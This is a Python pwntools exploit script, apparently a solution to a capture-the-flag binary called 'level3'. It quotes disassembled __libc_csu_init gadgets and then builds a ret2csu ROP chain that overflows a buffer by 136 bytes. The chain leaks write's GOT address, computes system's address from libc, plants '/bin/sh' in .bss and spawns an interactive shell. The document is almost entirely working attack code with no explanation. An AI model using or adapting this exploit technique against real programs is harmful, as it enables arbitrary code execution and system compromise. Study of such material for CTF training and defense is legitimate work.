temp = ''' 1
  400600:   4c 89 ea                mov    %r13,%rdx
  400603:   4c 89 f6                mov    %r14,%rsi
  400606:   44 89 ff                mov    %r15d,%edi
  400609:   41 ff 14 dc             callq  *(%r12,%rbx,8)
  40060d:   48 83 c3 01             add    $0x1,%rbx
  400611:   48 39 eb                cmp    %rbp,%rbx
  400614:   75 ea                   jne    400600 <__libc_csu_init+0x40>
  400616:   48 83 c4 08             add    $0x8,%rsp
  40061a:   5b                      pop    %rbx
  40061b:   5d                      pop    %rbp
  40061c:   41 5c                   pop    %r12
  40061e:   41 5d                   pop    %r13
  400620:   41 5e                   pop    %r14
  400622:   41 5f                   pop    %r15
  400624:   c3                      retq  

write(1,write_got,0x8)

main = 0x400587
poprbx = 0x40061a
movrdx = 0x400600
rbx = 0x0
rbp = 0x1
r12 = write_got # call *(write_got)
r13 = 0x8 # third
r14 = write_got # second
r15 = 0x1 # first
payload = 'B'*136 + p64(poprbx) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) +p64(r14) + p64(r15)
payload += p64(movrdx) + p64(0xdeadbeaf)*7 + p64(main)
 
read(0,bss_addr,0x8)
'''


from pwn import *


write_plt = 0x0000000000400430 
write_got = 0x0000000000601018
read_plt = 0x0000000000400440
read_got = 0x0000000000601020
main = 0x400587


p = process('./level3')
# gdb.attach(pidof(p)[0])
context.log_level = 'debug'

poprbx = 0x40061a
movrdx = 0x400600
rbx = 0x0
rbp = 0x1
r12 = write_got # call *(write_got)
r13 = 0x8 # third
r14 = write_got # second
r15 = 0x1 # first
payload = 'B'*136 + p64(poprbx) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) +p64(r14) + p64(r15)
payload += p64(movrdx) + p64(0xdeadbeaf)*7 + p64(main)

p.recvuntil('World\n')
p.sendline(payload)
write_addr = u64(p.recv(8))
log.info("write addr:" +hex(write_addr))


libc = ELF('./libc.so.6')
system_offset = libc.symbols['system']
write_offset = libc.symbols['write']
system_addr = write_addr - (write_offset - system_offset)

bss_addr = 0x0000000000601040
# read(0,bss_addr,0x10)
poprbx = 0x40061a
movrdx = 0x400600
rbx = 0x0
rbp = 0x1
r12 = read_got # call *(write_got)
r13 = 0x10 # third
r14 = bss_addr  # second
r15 = 0x0 # first
payload = 'B'*136 + p64(poprbx) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) +p64(r14) + p64(r15)
payload += p64(movrdx) + p64(0xdeadbeaf)*7 + p64(main)

p.recvuntil('World\n')
p.sendline(payload)
sleep(1)
raw_input()
p.send('/bin/sh\x00' + p64(system_addr))

# system(bss_addr) 
poprbx = 0x40061a
movrdx = 0x400600
rbx = 0x0
rbp = 0x1
r12 = bss_addr + 0x8 # call *(system_addr)
r13 = 0x0 # third
r14 = 0x0  # second
r15 = bss_addr # first /bin/sh\x00
payload = 'B'*136 + p64(poprbx) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) +p64(r14) + p64(r15)
payload += p64(movrdx) + p64(0x0)*7 + p64(main)

p.recvuntil('World\n')
p.sendline(payload)
p.interactive()















p.recv()

p.recv()
